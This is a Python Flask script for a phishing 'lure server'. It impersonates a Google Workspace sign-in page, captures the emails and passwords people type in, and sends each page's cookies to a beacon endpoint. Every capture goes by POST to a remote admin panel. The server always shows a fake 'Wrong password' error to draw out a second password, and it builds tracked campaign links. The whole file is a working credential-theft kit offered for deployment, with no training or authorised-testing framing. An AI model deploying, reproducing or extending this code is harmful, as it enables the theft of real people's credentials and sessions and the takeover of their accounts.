#!/usr/bin/env python3
"""
gPhish Lure Server — standalone victim-facing credential capture.
Deploy on a DIFFERENT server and DIFFERENT domain from the admin panel.

  LURE_KEY=secret123 PANEL_URL=https://your-panel PANEL_KEY=same-secret \
      python3 lure_server.py           # port 8080, put behind nginx/caddy
  LURE_PORT=80 python3 lure_server.py

Endpoints:
  /new?key=KEY          admin → auto-generate a tracked lure link
  /l/<id>               victim fake login (per-campaign tracking)
  /login                generic fake login (no tracking)
  /creds/cookies        JS beacon receiver
  /captures?key=KEY     admin → JSON of campaigns + captures
"""
import os, json, uuid, threading, datetime, requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
LURE_PORT = int(os.environ.get("LURE_PORT", 8080))
LURE_KEY  = os.environ.get("LURE_KEY", "changeme-lure")
PANEL_URL = os.environ.get("PANEL_URL", "")
PANEL_KEY = os.environ.get("PANEL_KEY", "")
DATA_FILE = os.environ.get("LURE_DATA", "lure_data.json")

STATE = {"campaigns": [], "captures": []}
if os.path.exists(DATA_FILE):
    STATE = {**STATE, **json.load(open(DATA_FILE))}
_lock = threading.Lock()

def save():
    with _lock:
        json.dump(STATE, open(DATA_FILE, "w"), indent=2)

def now(): return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def push_to_panel(capture):
    if not (PANEL_URL and PANEL_KEY):
        return
    try:
        requests.post(f"{PANEL_URL}/lure-ingest",
                      json={"key": PANEL_KEY, "capture": capture}, timeout=10)
    except Exception:
        pass

PAGE = """<!doctype html><html><head><title>Sign in — Google Accounts</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0}
.wrap{max-width:400px;margin:60px auto;padding:0 24px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px}
p.sub{color:#5f6368;text-align:center;margin:0 0 28px}
input{width:100%;padding:14px 16px;font-size:16px;border:1px solid #dadce0;
 border-radius:6px;margin-bottom:16px;outline:none}
input:focus{border-color:#1a73e8}
button{background:#1a73e8;color:#fff;border:none;border-radius:6px;
 padding:11px 26px;font-size:15px;font-weight:600;cursor:pointer;float:right}
.err{color:#d93025;font-size:13px;margin-bottom:14px}
</style></head><body><div class="wrap">
<h1>Sign in</h1><p class="sub">to continue to Google Workspace</p>
{% if error %}<p class="err">{{error}}</p>{% endif %}
<form method="post" action="/login">
  <input type="hidden" name="cid" value="{{cid}}">
  <input type="email" name="email" placeholder="Email or phone" required value="{{email or ''}}">
  <input type="password" name="password" placeholder="Enter your password" required>
  <button type="submit">Next</button>
</form></div>
<script>try{fetch('/creds/cookies?cid={{cid}}&c='+encodeURIComponent(document.cookie),{keepalive:true})}catch(e){}</script>
</body></html>"""

@app.route("/new")
def new_lure():
    """Auto-generate a unique tracked lure link."""
    if request.args.get("key") != LURE_KEY:
        return "Forbidden", 403
    cid = uuid.uuid4().hex[:8]
    STATE["campaigns"].insert(0, {"id": cid, "created": now(),
                                  "visits": 0, "captures": 0})
    save()
    base = request.host_url.rstrip("/")
    return jsonify({"lure_url": f"{base}/l/{cid}", "id": cid})

@app.route("/l/<cid>")
def lure_tracked(cid):
    camp = next((c for c in STATE["campaigns"] if c["id"] == cid), None)
    if camp:
        camp["visits"] += 1
        save()
    return render_template_string(PAGE, cid=cid, error=None, email=None)

@app.route("/login", methods=["GET"])
def lure_generic_get():
    return render_template_string(PAGE, cid="direct", error=None, email=None)

@app.route("/login", methods=["POST"])
def lure_post():
    cid = request.form.get("cid", "direct")
    email = request.form.get("email", "").strip()
    pw = request.form.get("password", "")
    if email and pw:
        cap = {"time": now(), "campaign": cid, "email": email,
               "password": pw,
               "ip": request.headers.get("X-Forwarded-For",
                     request.remote_addr or ""),
               "ua": request.headers.get("User-Agent", "")[:200],
               "cookies": ""}
        STATE["captures"].insert(0, cap)
        camp = next((c for c in STATE["campaigns"] if c["id"] == cid), None)
        if camp:
            camp["captures"] += 1
        save()
        push_to_panel(cap)
    # theater: "wrong password" prompts a second (often real) attempt
    return render_template_string(PAGE, cid=cid,
                                  error="Wrong password. Try again.",
                                  email=email)

@app.route("/creds/cookies")
def beacon():
    raw = request.args.get("c", "")
    cid = request.args.get("cid", "direct")
    if raw:
        target = next((c for c in STATE["captures"]
                       if c["campaign"] == cid and not c["cookies"]), None)
        if not target:
            target = {"time": now(), "campaign": cid, "email": "(pre-login)",
                      "password": "", "cookies": "",
                      "ip": request.headers.get("X-Forwarded-For",
                            request.remote_addr or ""), "ua": ""}
            STATE["captures"].insert(0, target)
        target["cookies"] = raw[:4000]
        save()
        push_to_panel(target)
    return ("", 204)

@app.route("/captures")
def captures():
    if request.args.get("key") != LURE_KEY:
        return "Forbidden", 403
    return jsonify(STATE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=LURE_PORT, debug=False)
